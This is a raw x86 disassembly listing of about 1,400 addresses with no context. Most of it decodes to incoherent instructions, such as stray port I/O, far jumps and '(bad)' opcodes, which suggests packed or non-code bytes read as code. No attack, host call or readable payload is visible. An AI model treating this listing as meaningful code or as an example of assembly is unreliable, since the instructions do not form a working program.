  40f638:	mov    ds,eax
  40f63a:	or     BYTE PTR [edi],ah
  40f63c:	fdecstp 
  40f63e:	ret    
  40f63f:	adc    DWORD PTR [esi-0x297e90ed],0xed4b2488
  40f649:	mov    ecx,0xe585be01
  40f64e:	repnz xchg esp,eax
  40f650:	or     DWORD PTR [edi+ebx*1+0x7e42d741],esi
  40f657:	icebp  
  40f658:	xor    eax,0x17cd486d
  40f65d:	dec    ebp
  40f65e:	in     eax,dx
  40f65f:	push   cs
  40f660:	and    edi,esp
  40f662:	lods   al,BYTE PTR ds:[esi]
  40f663:	or     cl,al
  40f665:	pop    DWORD PTR [edx]
  40f667:	xor    eax,0x99061876
  40f66c:	jb     0x40f634
  40f66e:	out    0x72,eax
  40f670:	xchg   DWORD PTR [edi+0x609fd120],ecx
  40f676:	fcomi  st,st(2)
  40f678:	jno    0x40f5fb
  40f67a:	mov    edx,0x13322f0d
  40f67f:	ss mov ebp,0x2fcae0df
  40f685:	jge    0x40f647
  40f687:	aas    
  40f688:	and    al,0x4
  40f68a:	sbb    esp,0x73
  40f68d:	jbe    0x40f6a6
  40f68f:	jae    0x40f6c9
  40f691:	sbb    DWORD PTR [esi],edx
  40f693:	push   ss
  40f694:	push   0xffffffbd
  40f696:	cs pop esp
  40f698:	int3   
  40f699:	xchg   esp,eax
  40f69a:	jp     0x40f6ea
  40f69c:	add    eax,0xc5fb9b08
  40f6a1:	add    cl,BYTE PTR [esi-0x55]
  40f6a4:	adc    dh,BYTE PTR [esi]
  40f6a6:	fcom   QWORD PTR [ebx+0x4884bd6f]
  40f6ac:	sub    DWORD PTR [ebp+ebx*4-0x2d],0x49
  40f6b1:	pop    edx
  40f6b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6b3:	sbb    eax,0x35d2883c
  40f6b8:	sub    BYTE PTR [ecx-0x3a],bl
  40f6bb:	(bad)  ss:[edi-0xc01a70c]
  40f6c2:	stos   DWORD PTR es:[edi],eax
  40f6c3:	pop    esi
  40f6c4:	xchg   ebx,eax
  40f6c5:	pop    ebx
  40f6c6:	call   0x781a:0xb902b94b
  40f6cd:	test   eax,0x224fc691
  40f6d2:	(bad)  
  40f6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6d4:	sub    esi,DWORD PTR [eax]
  40f6d6:	inc    ebx
  40f6d7:	int    0x61
  40f6d9:	jle    0x40f717
  40f6db:	out    dx,eax
  40f6dc:	jo     0x40f697
  40f6de:	xor    BYTE PTR [edi-0x2a5c8b22],0xc3
  40f6e5:	retf   
  40f6e6:	adc    DWORD PTR [ebx],eax
  40f6e8:	out    0x4e,eax
  40f6ea:	clc    
  40f6eb:	(bad)  
  40f6ed:	add    dl,al
  40f6ef:	xor    BYTE PTR [esi+0x47],bl
  40f6f2:	and    eax,0xe4fe6665
  40f6f7:	mov    esp,0xaac1b4a0
  40f6fc:	xor    eax,0xe2fa5d20
  40f701:	ins    BYTE PTR es:[edi],dx
  40f702:	lds    eax,FWORD PTR [ecx-0x5c84f77a]
  40f708:	jp     0x40f740
  40f70a:	aas    
  40f70b:	jg     0x40f6fa
  40f70d:	jl     0x40f773
  40f70f:	stos   BYTE PTR es:[edi],al
  40f710:	out    dx,eax
  40f711:	iret   
  40f712:	pop    eax
  40f713:	pusha  
  40f714:	aad    0x0
  40f716:	das    
  40f717:	or     BYTE PTR [edi-0x4a983965],al
  40f71d:	dec    edx
  40f71e:	cmp    al,0xb0
  40f720:	retf   
  40f721:	arpl   si,cx
  40f723:	xor    al,0xfe
  40f725:	in     eax,dx
  40f726:	std    
  40f727:	mov    edx,0x84b53eb6
  40f72c:	out    0xc3,al
  40f72e:	data16 and BYTE PTR [eax-0x7e],ch
  40f732:	shl    BYTE PTR [ebx+0x4efaa107],0xfd
  40f739:	jg     0x40f78b
  40f73b:	rcr    BYTE PTR [ebx+ebx*1-0x61],0x6c
  40f740:	int3   
  40f741:	cmc    
  40f742:	mov    DWORD PTR [edx],eax
  40f744:	fst    DWORD PTR [esi-0x61]
  40f747:	pmulhuw mm5,QWORD PTR [eax]
  40f74a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f74b:	mov    ebx,0x366fd679
  40f750:	jbe    0x40f735
  40f752:	fnsave ss:[edi+ecx*4-0x60]
  40f757:	popf   
  40f758:	pop    ebp
  40f759:	repnz push edx
  40f75b:	push   es
  40f75c:	fstp   DWORD PTR [ecx]
  40f75e:	cmc    
  40f75f:	retf   
  40f760:	pop    esi
  40f761:	add    ebx,DWORD PTR [ebx+ebx*2+0x57939de]
  40f768:	xor    bl,cl
  40f76a:	(bad)  
  40f76b:	aam    0x34
  40f76d:	adc    DWORD PTR [ebp-0x6b],ecx
  40f770:	mov    al,0xf0
  40f772:	sub    bl,BYTE PTR [ecx-0x7a]
  40f775:	das    
  40f776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f777:	call   0xd13e:0x8df6c3a4
  40f77e:	jmp    FWORD PTR [ebx-0x268ea8ea]
  40f784:	test   BYTE PTR [ecx],0x2f
  40f787:	sbb    ecx,DWORD PTR [ecx-0x5e2c98bb]
  40f78d:	mov    esi,0x5fa2b785
  40f792:	push   es
  40f793:	inc    esi
  40f794:	adc    esp,DWORD PTR [esi]
  40f796:	stos   DWORD PTR es:[edi],eax
  40f797:	rcr    DWORD PTR [ebx],1
  40f799:	inc    esp
  40f79a:	retf   
  40f79b:	xchg   DWORD PTR [edi+0x5d],ecx
  40f79e:	dec    esi
  40f79f:	dec    esi
  40f7a0:	xor    BYTE PTR [esi-0x1678a6e6],cl
  40f7a6:	lds    edx,FWORD PTR [eax-0x3bc4f8be]
  40f7ac:	stc    
  40f7ad:	sti    
  40f7ae:	dec    edi
  40f7af:	mov    ds,WORD PTR [eax-0x6933bd59]
  40f7b5:	pop    ebp
  40f7b6:	jnp    0x40f7c8
  40f7b8:	ror    DWORD PTR [ebp+0x50976932],1
  40f7be:	aas    
  40f7bf:	pop    ds
  40f7c0:	cwde   
  40f7c1:	outs   dx,BYTE PTR ds:[esi]
  40f7c2:	add    DWORD PTR [edi-0xc75f0c6],eax
  40f7c8:	cmp    al,0xe2
  40f7ca:	ins    BYTE PTR es:[edi],dx
  40f7cb:	xchg   esi,eax
  40f7cc:	xor    edi,edx
  40f7ce:	(bad)  
  40f7cf:	aaa    
  40f7d0:	xor    eax,0x2208e42e
  40f7d5:	pop    es
  40f7d6:	lea    edx,ds:0x8d764ad
  40f7dc:	(bad)  
  40f7de:	lds    ecx,FWORD PTR ds:0x7d2dc38e
  40f7e4:	dec    ebp
  40f7e5:	pop    ss
  40f7e6:	inc    esp
  40f7e7:	dec    ebp
  40f7e8:	push   ebp
  40f7e9:	repnz sti 
  40f7eb:	in     eax,0x8a
  40f7ed:	xchg   esi,eax
  40f7ee:	sub    al,0x57
  40f7f0:	mov    ds:0x2cb7c604,eax
  40f7f5:	ins    DWORD PTR es:[edi],dx
  40f7f6:	mov    ecx,ecx
  40f7f8:	out    dx,al
  40f7f9:	dec    ebx
  40f7fa:	sar    BYTE PTR [edi],0xe9
  40f7fd:	add    al,0xcb
  40f7ff:	ja     0x40f79d
  40f801:	std    
  40f802:	mov    edx,0xe704b317
  40f807:	inc    ebp
  40f808:	js     0x40f7b6
  40f80a:	push   ecx
  40f80b:	fucomi st,st(3)
  40f80d:	fnsave [edx-0x6d]
  40f810:	inc    edi
  40f811:	adc    edx,DWORD PTR [ebx-0x7]
  40f814:	(bad)  
  40f815:	loope  0x40f810
  40f817:	or     al,0xe2
  40f819:	pop    edx
  40f81a:	cmp    bh,BYTE PTR [ebx-0x2e]
  40f81d:	jecxz  0x40f842
  40f81f:	test   edi,0x44a5e30f
  40f825:	push   ebx
  40f826:	into   
  40f827:	adc    ecx,DWORD PTR [edx-0x57]
  40f82a:	imul   ebp,DWORD PTR [esi-0x39],0xffffff9f
  40f82e:	ret    
  40f82f:	mov    edi,0x27b3fef6
  40f834:	dec    edi
  40f835:	inc    esp
  40f836:	jo     0x40f86a
  40f838:	mov    edx,0x52865e48
  40f83d:	sbb    bl,ch
  40f83f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f840:	adc    BYTE PTR [esi],cl
  40f842:	xbegin 0xcfe1e9f7
  40f848:	xchg   esp,eax
  40f849:	retf   
  40f84a:	aad    0x1
  40f84c:	sahf   
  40f84d:	out    0xfc,eax
  40f84f:	xor    eax,0x62be0b0
  40f854:	add    DWORD PTR [edx-0x66],ebx
  40f857:	out    dx,eax
  40f858:	dec    ebp
  40f859:	jmp    0x40f8c6
  40f85b:	jae    0x40f887
  40f85d:	push   ebx
  40f85e:	pushf  
  40f85f:	mov    cl,0x76
  40f861:	pop    edi
  40f862:	fiadd  DWORD PTR [edi+0x751ee0c6]
  40f868:	push   ebp
  40f869:	jmp    0x40f84c
  40f86b:	push   ebx
  40f86c:	jae    0x40f80e
  40f86e:	sub    DWORD PTR [ecx],ebp
  40f870:	sub    DWORD PTR [ecx-0x6],0x9381628c
  40f877:	scas   al,BYTE PTR es:[edi]
  40f878:	or     DWORD PTR [eax+0x4e],ecx
  40f87b:	or     al,0xa5
  40f87d:	pop    esp
  40f87e:	mov    dh,0xfc
  40f880:	out    0x54,eax
  40f882:	fld    DWORD PTR [edi-0x3e02a0a5]
  40f888:	sub    eax,0x262d4237
  40f88d:	ret    0x9582
  40f890:	jl     0x40f8ad
  40f892:	add    eax,0x300219f5
  40f897:	dec    ecx
  40f898:	push   esp
  40f899:	jae    0x40f822
  40f89b:	mov    ecx,0xd6d4a22d
  40f8a0:	cmp    BYTE PTR [edi],bh
  40f8a2:	and    eax,0x664d1895
  40f8a7:	cmp    ah,BYTE PTR [edi+0x293d616a]
  40f8ad:	pushf  
  40f8ae:	test   BYTE PTR [esi-0x455c2c82],dl
  40f8b4:	mov    ebp,edi
  40f8b6:	fwait
  40f8b7:	mov    ah,0xed
  40f8b9:	inc    esi
  40f8ba:	sbb    DWORD PTR ds:0xd5e52d0c,ecx
  40f8c0:	ins    BYTE PTR es:[edi],dx
  40f8c1:	js     0x40f920
  40f8c3:	mov    fs,WORD PTR [esi-0x6d]
  40f8c6:	sar    ebp,cl
  40f8c8:	inc    esi
  40f8c9:	xchg   edi,eax
  40f8ca:	xchg   esp,eax
  40f8cb:	jmp    0x7c49:0xb3540fe2
  40f8d2:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40f8d4:	mov    ecx,0xb64a8f30
  40f8d9:	push   cs
  40f8da:	and    DWORD PTR [ecx+0x76e5a5f6],0x9b076567
  40f8e4:	outs   dx,DWORD PTR ds:[esi]
  40f8e5:	ins    DWORD PTR es:[edi],dx
  40f8e6:	arpl   WORD PTR [ebx],bp
  40f8e8:	mov    ecx,0xd9b86cc5
  40f8ed:	stos   BYTE PTR es:[edi],al
  40f8ee:	scas   al,BYTE PTR es:[edi]
  40f8ef:	mov    eax,ds:0xd55e4719
  40f8f4:	lods   al,BYTE PTR ds:[esi]
  40f8f5:	sbb    dh,ah
  40f8f7:	mov    ah,0x5a
  40f8f9:	mov    ds:0x7e3250bf,eax
  40f8fe:	ror    DWORD PTR [ebx-0x2d],cl
  40f901:	loop   0x40f8ef
  40f903:	aas    
  40f904:	and    DWORD PTR [ebp+0x1b04ae6f],0x402cdad5
  40f90e:	daa    
  40f90f:	stos   BYTE PTR es:[edi],al
  40f910:	mov    ?,ecx
  40f912:	outs   dx,BYTE PTR ds:[esi]
  40f913:	pop    esp
  40f914:	xchg   edi,eax
  40f915:	cmc    
  40f916:	push   edi
  40f917:	repz pop es
  40f919:	cmc    
  40f91a:	dec    esi
  40f91b:	pop    esi
  40f91c:	push   esp
  40f91d:	lahf   
  40f91e:	fs cmc 
  40f920:	aaa    
  40f921:	popf   
  40f922:	mov    ebx,0x5d6341a6
  40f927:	imul   esp,DWORD PTR [ebx+0x71],0xa5212e18
  40f92e:	das    
  40f92f:	or     eax,0x8f62461f
  40f934:	pop    es
  40f935:	in     eax,0x59
  40f937:	rcr    ebp,1
  40f939:	pop    eax
  40f93a:	jne    0x40f988
  40f93c:	sub    al,0xa6
  40f93e:	or     BYTE PTR [esi-0x594fc442],0x43
  40f945:	xchg   edi,eax
  40f946:	outs   dx,DWORD PTR ds:[esi]
  40f947:	fisttp WORD PTR es:[ebp+0x1bc84192]
  40f94e:	add    ah,BYTE PTR [ebx]
  40f950:	in     eax,0x12
  40f952:	xor    al,0x4
  40f954:	pop    esp
  40f955:	enter  0xbbc1,0xcb
  40f959:	aad    0x8b
  40f95b:	pminsw mm6,QWORD PTR [esi-0x840e130]
  40f962:	pop    ebx
  40f963:	ins    DWORD PTR es:[edi],dx
  40f964:	fs retf 
  40f966:	stc    
  40f967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f968:	push   cs
  40f969:	in     al,0xb5
  40f96b:	arpl   WORD PTR [ebx],ax
  40f96d:	mov    ah,0xb7
  40f96f:	jmp    0x40f92d
  40f971:	ss call 0x863f28a
  40f977:	cld    
  40f978:	sbb    BYTE PTR [esi-0x57501a50],cl
  40f97e:	imul   esi,eax,0x8
  40f981:	mov    DWORD PTR ds:0x35b59bc3,ebx
  40f987:	pop    ds
  40f988:	repz jecxz 0x40f9d0
  40f98b:	jle    0x40f9b9
  40f98d:	cmp    esp,ecx
  40f98f:	in     eax,0xd8
  40f991:	lahf   
  40f992:	aaa    
  40f993:	push   ss
  40f994:	pop    edx
  40f995:	outs   dx,BYTE PTR ds:[esi]
  40f996:	add    dl,BYTE PTR [ebx]
  40f998:	adc    DWORD PTR ds:0x68114b0b,eax
  40f99e:	inc    edx
  40f99f:	out    dx,al
  40f9a0:	sbb    BYTE PTR [ebx+eiz*8+0xa],ch
  40f9a4:	jp     0x40f931
  40f9a6:	xchg   edi,eax
  40f9a7:	xor    eax,DWORD PTR [eax-0x2d]
  40f9aa:	xchg   ebp,eax
  40f9ab:	or     DWORD PTR [ecx-0x59ba3732],eax
  40f9b1:	pop    ebp
  40f9b2:	push   cs
  40f9b3:	inc    ebx
  40f9b4:	outs   dx,BYTE PTR ds:[esi]
  40f9b5:	mov    al,ds:0xd3efc145
  40f9ba:	jnp    0x40f9cd
  40f9bc:	js     0x40fa3c
  40f9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9bf:	gs jecxz 0x40f98d
  40f9c2:	pop    eax
  40f9c3:	daa    
  40f9c4:	mov    ch,0x5
  40f9c6:	inc    ebx
  40f9c7:	mov    eax,ds:0xab33375b
  40f9cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9cd:	sub    eax,0x9ee42e98
  40f9d2:	mov    DWORD PTR [eax],eax
  40f9d4:	(bad)  
  40f9d6:	sub    BYTE PTR [ebx],ah
  40f9d8:	imul   DWORD PTR [ecx+0x36]
  40f9db:	adc    DWORD PTR [esi-0x76eb5128],esp
  40f9e1:	xchg   ah,dh
  40f9e3:	fld    DWORD PTR es:[edx-0x1c]
  40f9e7:	rcl    DWORD PTR [ebx+eax*8+0x770f5b3f],0xc7
  40f9ef:	add    BYTE PTR [ebp-0x1f],bh
  40f9f2:	scas   eax,DWORD PTR es:[edi]
  40f9f3:	in     eax,dx
  40f9f4:	das    
  40f9f5:	(bad)  
  40f9f6:	call   0xe76a2e3
  40f9fb:	adc    DWORD PTR [ecx+0x63],esp
  40f9fe:	test   DWORD PTR [ecx],ecx
  40fa00:	ja     0x40f9d3
  40fa02:	cli    
  40fa03:	mov    eax,ds:0x1758b4f3
  40fa08:	sbb    eax,esi
  40fa0a:	jno    0x40fa71
  40fa0c:	dec    ecx
  40fa0d:	fadd   QWORD PTR [esi-0x5215c62d]
  40fa13:	xchg   BYTE PTR [edi+0x610acac2],ch
  40fa19:	jp     0x40f9e6
  40fa1b:	dec    eax
  40fa1c:	cdq    
  40fa1d:	mov    ebp,0x4ba0b1a5
  40fa22:	in     eax,0xb8
  40fa24:	lock stc 
  40fa26:	out    0x3b,al
  40fa28:	fmul   DWORD PTR [edx+0x104d6f43]
  40fa2e:	outs   dx,BYTE PTR ds:[esi]
  40fa2f:	and    BYTE PTR [edi],dh
  40fa31:	pop    edi
  40fa32:	xchg   edi,eax
  40fa33:	stc    
  40fa34:	loope  0x40faa4
  40fa36:	xchg   dl,dh
  40fa38:	or     BYTE PTR [ecx-0x4a],ch
  40fa3b:	dec    esp
  40fa3c:	test   eax,0xe4db798a
  40fa41:	int    0xd1
  40fa43:	test   DWORD PTR [edx-0x54],edi
  40fa46:	push   ss
  40fa47:	fcmovnu st,st(7)
  40fa49:	and    dl,BYTE PTR [ecx+0x531462a2]
  40fa4f:	add    bh,BYTE PTR [edx]
  40fa51:	cmp    eax,0x97210a6f
  40fa56:	push   esp
  40fa57:	int    0x15
  40fa59:	sbb    al,BYTE PTR [esp+ebx*4+0x2b]
  40fa5d:	ret    0x60fd
  40fa60:	fcmovbe st,st(3)
  40fa62:	xor    cl,al
  40fa64:	aam    0xdd
  40fa66:	imul   esp,DWORD PTR [edx],0xceb3a651
  40fa6c:	rcl    DWORD PTR [edi+0x7b],0x12
  40fa70:	jg     0x40faa6
  40fa72:	dec    edi
  40fa73:	dec    esp
  40fa74:	jns    0x40fa63
  40fa76:	retf   
  40fa77:	pop    ecx
  40fa78:	mov    dl,BYTE PTR [ebx-0x659e2047]
  40fa7e:	aas    
  40fa7f:	ret    0x354d
  40fa82:	je     0x40faf9
  40fa84:	loopne 0x40faaa
  40fa86:	pop    ebp
  40fa87:	cdq    
  40fa88:	push   ecx
  40fa89:	mov    dl,0x82
  40fa8b:	into   
  40fa8c:	pop    es
  40fa8d:	arpl   WORD PTR [esi+edi*4-0x20],bp
  40fa91:	loop   0x40fa29
  40fa93:	mov    al,ds:0xcdb24d50
  40fa98:	mov    BYTE PTR [edi],al
  40fa9a:	inc    ebx
  40fa9b:	rol    BYTE PTR [edi],0x36
  40fa9e:	cld    
  40fa9f:	addr16 shr cl,cl
  40faa2:	mov    gs,WORD PTR [edi]
  40faa4:	sar    BYTE PTR [ecx],1
  40faa6:	mov    ch,0xe8
  40faa8:	stc    
  40faa9:	pop    eax
  40faaa:	fwait
  40faab:	cld    
  40faac:	rcr    BYTE PTR [ecx],cl
  40faae:	xor    al,0xc1
  40fab0:	mov    ch,0x59
  40fab2:	mov    ch,0x49
  40fab4:	inc    eax
  40fab5:	and    DWORD PTR [eax-0x1a],eax
  40fab8:	mov    ah,0x68
  40faba:	mov    eax,0xc7da9554
  40fabf:	in     eax,0x8f
  40fac1:	test   BYTE PTR [edx],al
  40fac3:	ficom  WORD PTR [eax]
  40fac5:	jns    0x40fb3c
  40fac7:	lods   eax,DWORD PTR ds:[esi]
  40fac8:	lock xchg ebp,eax
  40faca:	jb     0x40fb3c
  40facc:	push   es
  40facd:	sub    al,0xbd
  40facf:	xchg   edx,eax
  40fad0:	shl    edx,1
  40fad2:	mov    ecx,DWORD PTR [edx]
  40fad4:	div    BYTE PTR [edx+ebx*4+0x21]
  40fad8:	aad    0x92
  40fada:	jb     0x40fafc
  40fadc:	imul   edx,DWORD PTR [si+0x764e],0x5
  40fae2:	mov    DWORD PTR [ecx],eax
  40fae4:	in     al,0xd3
  40fae6:	(bad)  
  40fae8:	iret   
  40fae9:	pop    es
  40faea:	lock dec edx
  40faec:	sbb    dl,BYTE PTR [edi+eax*8-0x26]
  40faf0:	into   
  40faf1:	jl     0x40faa1
  40faf3:	inc    BYTE PTR [ebx+0x27912a17]
  40faf9:	or     al,0xea
  40fafb:	test   al,0x2b
  40fafd:	loop   0x40fab0
  40faff:	xor    DWORD PTR cs:[esp+eiz*4-0x2d],esp
  40fb04:	pushf  
  40fb05:	jmp    DWORD PTR [esi+0x4746205b]
  40fb0b:	or     eax,0x889e81a9
  40fb10:	out    dx,eax
  40fb11:	push   eax
  40fb12:	ss add eax,0x1e03913d
  40fb18:	mov    ds:0xe5dced5f,al
  40fb1d:	push   cs
  40fb1e:	or     al,0x33
  40fb21:	pop    ds
  40fb22:	imul   BYTE PTR [edi+edx*4-0x712eb2b4]
  40fb29:	jo     0x40fb6e
  40fb2b:	pop    edi
  40fb2c:	mov    ebx,ecx
  40fb2e:	cmc    
  40fb2f:	hlt    
  40fb30:	int    0x86
  40fb32:	xchg   ebx,eax
  40fb33:	pop    ebx
  40fb34:	adc    edi,DWORD PTR [ecx-0x247fc635]
  40fb3a:	iret   
  40fb3b:	pushf  
  40fb3c:	fdiv   DWORD PTR [edi]
  40fb3e:	jge    0x40fae4
  40fb40:	into   
  40fb41:	stos   DWORD PTR es:[edi],eax
  40fb42:	cmp    esi,edi
  40fb44:	repnz xchg ecx,eax
  40fb46:	mov    ch,0x17
  40fb48:	adc    dl,BYTE PTR [ecx+0x423dcf82]
  40fb4e:	enter  0xaf84,0x6a
  40fb52:	inc    ebx
  40fb53:	call   FWORD PTR [esi+edi*1-0x6a5b65df]
  40fb5a:	js     0x40fb8f
  40fb5c:	jecxz  0x40faf4
  40fb5e:	or     eax,0x52446a49
  40fb63:	sahf   
  40fb64:	mov    esi,DWORD PTR [bp+si]
  40fb67:	call   0xc1d9:0x4e54f8d1
  40fb6e:	adc    al,0xb3
  40fb70:	popa   
  40fb71:	push   eax
  40fb72:	(bad)
  40fb75:	out    dx,al
  40fb76:	fbstp  TBYTE PTR [edi-0x32]
  40fb79:	daa    
  40fb7a:	jle    0x40fb8e
  40fb7c:	xchg   DWORD PTR ds:0xfbeeb2ee,ecx
  40fb82:	sbb    DWORD PTR [ebp-0x15],edi
  40fb85:	test   BYTE PTR [edi-0x106759b4],bh
  40fb8b:	jmp    0x8778:0x2b6d9d85
  40fb92:	lahf   
  40fb93:	repz dec ebp
  40fb95:	and    BYTE PTR [esi+0x2b],0x70
  40fb99:	xor    ah,BYTE PTR [eax-0x48]
  40fb9c:	pop    ebp
  40fb9d:	jl     0x40fb26
  40fb9f:	jle    0x40fb27
  40fba1:	push   ss
  40fba2:	push   esi
  40fba3:	mov    ah,0x8b
  40fba5:	je     0x40fb8d
  40fba7:	hlt    
  40fba8:	jle    0x40fb9c
  40fbaa:	cwde   
  40fbab:	sbb    eax,DWORD PTR [ebx-0x5f]
  40fbae:	and    ebp,esi
  40fbb0:	aas    
  40fbb1:	int3   
  40fbb2:	ds gs xor eax,0x720f7274
  40fbb9:	push   es
  40fbba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbbb:	push   cs
  40fbbc:	mov    ah,0x30
  40fbbe:	sub    ebp,DWORD PTR [ebp+0x52]
  40fbc1:	pop    esi
  40fbc2:	xchg   esi,eax
  40fbc3:	loopne 0x40fbae
  40fbc5:	xchg   ebp,eax
  40fbc6:	(bad)  
  40fbc9:	and    ch,BYTE PTR [ecx-0x2c78a7fc]
  40fbcf:	dec    esi
  40fbd0:	sbb    al,0xaa
  40fbd2:	out    0x15,al
  40fbd4:	les    ebx,FWORD PTR [edx]
  40fbd6:	pop    esi
  40fbd7:	push   esi
  40fbd8:	jae    0x40fc18
  40fbda:	mov    ds:0xcfbff67b,al
  40fbdf:	mov    dl,0xcf
  40fbe1:	(bad)  
  40fbe2:	jp     0x40fc05
  40fbe4:	pop    esi
  40fbe5:	ds push esi
  40fbe7:	jae    0x40fba3
  40fbe9:	jb     0x40fbbe
  40fbeb:	pop    eax
  40fbec:	push   ebp
  40fbed:	test   al,0x4e
  40fbef:	push   ebx
  40fbf0:	xchg   BYTE PTR [eax-0x12],ah
  40fbf3:	ja     0x40fc6c
  40fbf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf6:	inc    DWORD PTR [edi+ebp*2+0x62]
  40fbfa:	mov    DWORD PTR [ebx],ecx
  40fbfc:	dec    edx
  40fbfd:	js     0x40fbb3
  40fbff:	pop    ds
  40fc00:	xchg   ebx,eax
  40fc01:	pop    ds
  40fc02:	ds cmc 
  40fc04:	in     eax,dx
  40fc05:	popa   
  40fc06:	(bad)  
  40fc07:	mov    ebx,0x661503df
  40fc0c:	sbb    BYTE PTR [edx-0x6a],ch
  40fc0f:	pusha  
  40fc10:	or     DWORD PTR [esi-0x5379fb6b],esp
  40fc16:	pop    esp
  40fc17:	cmp    eax,0xfe493021
  40fc1c:	dec    edx
  40fc1d:	and    DWORD PTR [ecx+0x21f0ed91],ebp
  40fc23:	addr16 inc esi
  40fc25:	mov    esi,0x62c7fb89
  40fc2a:	adc    BYTE PTR [eax-0x1],ch
  40fc2d:	scas   eax,DWORD PTR es:[edi]
  40fc2e:	jbe    0x40fbcc
  40fc30:	xchg   edi,eax
  40fc31:	and    eax,DWORD PTR [esi]
  40fc33:	int3   
  40fc34:	cmp    eax,DWORD PTR [ebp+0x3d]
  40fc37:	mov    eax,0xfc3eb946
  40fc3c:	jb     0x40fc1e
  40fc3e:	xor    DWORD PTR ds:0x49ffbb95,esp
  40fc44:	xchg   ecx,eax
  40fc45:	sahf   
  40fc46:	pop    esp
  40fc47:	lods   al,BYTE PTR ds:[esi]
  40fc48:	inc    edx
  40fc49:	lock sub BYTE PTR ds:[eax-0xf7050e0],0x7e
  40fc52:	(bad)  
  40fc53:	push   0xcb511332
  40fc58:	lea    esi,[ebx-0x3f054ce3]
  40fc5e:	nop
  40fc5f:	dec    ebp
  40fc60:	or     al,0x73
  40fc62:	dec    ebx
  40fc63:	jge    0x40fc16
  40fc65:	and    edx,DWORD PTR [esi]
  40fc67:	fstp   TBYTE PTR [edi]
  40fc69:	adc    DWORD PTR [ecx-0x56],0x2b
  40fc6d:	iret   
  40fc6e:	ss push es
  40fc70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc71:	and    al,0x50
  40fc73:	dec    ecx
  40fc74:	xchg   ecx,eax
  40fc75:	fdiv   st,st(6)
  40fc77:	retf   0x8ae6
  40fc7a:	pusha  
  40fc7b:	imul   BYTE PTR [esi-0x22]
  40fc7e:	xor    BYTE PTR [ecx],dl
  40fc80:	jg     0x40fcb2
  40fc82:	ds test DWORD PTR es:[edx+ecx*4+0x2b2cccc0],edi
  40fc8b:	daa    
  40fc8c:	aaa    
  40fc8d:	test   al,0xa6
  40fc8f:	(bad)  
  40fc90:	das    
  40fc91:	test   al,0x94
  40fc93:	push   ebp
  40fc94:	retf   0x9d2
  40fc97:	push   ds
  40fc98:	imul   esi,DWORD PTR [edx],0x7a27e2a7
  40fc9e:	daa    
  40fc9f:	fmul   DWORD PTR [esi]
  40fca1:	mov    ch,0xcb
  40fca3:	push   es
  40fca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fca5:	pop    ebx
  40fca6:	in     eax,dx
  40fca7:	sub    al,0xac
  40fca9:	lahf   
  40fcaa:	dec    esi
  40fcab:	add    BYTE PTR ds:[ebx],ah
  40fcae:	mov    al,ds:0xae613d70
  40fcb3:	into   
  40fcb4:	sbb    al,0x78
  40fcb6:	sbb    dl,BYTE PTR [edx]
  40fcb8:	inc    esp
  40fcb9:	scas   al,BYTE PTR es:[edi]
  40fcba:	es enter 0x375b,0xf4
  40fcbf:	das    
  40fcc0:	mov    eax,ds:0x5cdd9856
  40fcc5:	and    bl,BYTE PTR [edi+0x4d]
  40fcc8:	add    bl,dh
  40fcca:	mov    esp,es
  40fccc:	dec    esp
  40fccd:	jmp    0xb458:0x9b578dcb
  40fcd4:	in     al,0xc3
  40fcd6:	jno    0x40fd46
  40fcd8:	cli    
  40fcd9:	dec    edx
  40fcda:	adc    eax,0x129e112f
  40fcdf:	fmul   DWORD PTR [ecx]
  40fce1:	popf   
  40fce2:	sar    edi,cl
  40fce4:	adc    BYTE PTR [ecx-0x4e],ch
  40fce7:	bts    DWORD PTR [edx+0x70e426d5],esp
  40fcee:	cs jmp 0x6fbd2bd
  40fcf4:	ss mov esi,ebx
  40fcf7:	popa   
  40fcf8:	lods   al,BYTE PTR ds:[esi]
  40fcf9:	(bad)  
  40fcfa:	mov    edx,0x307d71e7
  40fcff:	imul   edi,DWORD PTR [ebp-0x382e526d],0xffffffbf
  40fd06:	inc    esi
  40fd07:	jo     0x40fd21
  40fd09:	(bad)  
  40fd0a:	mov    eax,0x8fef40bd
  40fd0f:	xor    bl,ch
  40fd11:	(bad)  
  40fd12:	int    0x40
  40fd14:	in     al,0x45
  40fd16:	jl     0x40fd89
  40fd18:	mov    dh,0x52
  40fd1a:	retf   
  40fd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd1c:	call   0x9f0e0f7b
  40fd21:	ret    
  40fd22:	into   
  40fd23:	cmp    ch,al
  40fd25:	xchg   ebp,eax
  40fd26:	leave  
  40fd27:	pop    ss
  40fd28:	jb     0x40fcd1
  40fd2a:	xor    eax,0xb51157af
  40fd2f:	xor    al,0xd5
  40fd31:	pop    esi
  40fd32:	mov    dl,bh
  40fd34:	pop    ds
  40fd35:	xor    eax,0xc5b1e122
  40fd3a:	xchg   ebp,eax
  40fd3b:	or     eax,0x84c02926
  40fd40:	test   al,0x3e
  40fd42:	inc    edi
  40fd43:	mov    edi,ecx
  40fd45:	in     eax,0x7f
  40fd47:	shr    al,cl
  40fd49:	outs   dx,BYTE PTR ds:[esi]
  40fd4a:	leave  
  40fd4b:	sub    BYTE PTR [eax+0xb],ch
  40fd4e:	fist   DWORD PTR [esi]
  40fd50:	push   0x4ef316cf
  40fd55:	xchg   esi,eax
  40fd56:	scas   al,BYTE PTR es:[edi]
  40fd57:	setb   BYTE PTR [esi+0x49]
  40fd5b:	rcl    BYTE PTR ds:0x3db67629,cl
  40fd61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd62:	sub    DWORD PTR [edi+eiz*8-0x2e64da3e],ebx
  40fd69:	add    al,0xe3
  40fd6b:	xchg   ecx,eax
